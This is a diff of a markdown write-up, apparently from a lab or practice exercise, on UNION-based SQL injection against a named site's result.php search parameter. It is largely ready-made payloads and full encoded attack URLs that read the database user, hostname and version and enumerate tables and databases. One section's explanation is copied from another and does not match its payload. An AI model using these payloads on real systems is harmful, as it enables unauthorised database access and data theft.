@@ -72,7 +72,7 @@ This converts the payload into a format suitable for use in a URL.
 
 we can't use Error-Based Injection in this website because the error stop the flow of execution in the server.
 
-#### Retrieving User Name
+### Retrieving User Name
 
 To find the username of the current MySQL user through SQL injection, you can use the user() function in your SQL injection payload. This function returns the current MySQL user and host.
 To retrieve the database user name, use the following payload:
@@ -85,7 +85,7 @@ plaintext
 
 https://fruits.selfmade.solutions/result.php?search=%27%20UNION%20SELECT%20user%28%29%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%3B--%20
 
-#### Retrieving Server Name
+### Retrieving Server Name
 
 To find the username of the current MySQL user through SQL injection, you can use the user() function in your SQL injection payload. This function returns the current MySQL user and host.
 To retrieve the database user name, use the following payload:
@@ -96,7 +96,7 @@ Full URL
 
 https://fruits.selfmade.solutions/result.php?search=%27%20UNION%20SELECT%20%40%40hostname%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%3B--%20
 
-#### Retriving Sql Version 
+### Retriving Sql Version 
 
 use the following payload:
 
@@ -106,8 +106,24 @@ Full URL
 
 https://fruits.selfmade.solutions/result.php?search=%27%20UNION%20SELECT%20version%28%29%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%3B--%20
 
+### Listing All Tables in the Database
 
+To list all tables in the current database, use:
 
+`' UNION SELECT GROUP_CONCAT(table_name), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = database();-- `
 
+Full URL
+
+https://fruits.selfmade.solutions/result.php?search=%27%20UNION%20SELECT%20GROUP_CONCAT%28table_name%29%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%20FROM%20information_schema.tables%20WHERE%20table_schema%20%3D%20database%28%29%3B--%20
+
+### Listing All Databases
+
+To list all databases, use:
+
+`' UNION SELECT GROUP_CONCAT(schema_name), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.schemata;-- `
+
+Full URL
+
+https://fruits.selfmade.solutions/result.php?search=%27%20UNION%20SELECT%20GROUP_CONCAT%28schema_name%29%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%20FROM%20information_schema.schemata%3B--%20
 
 
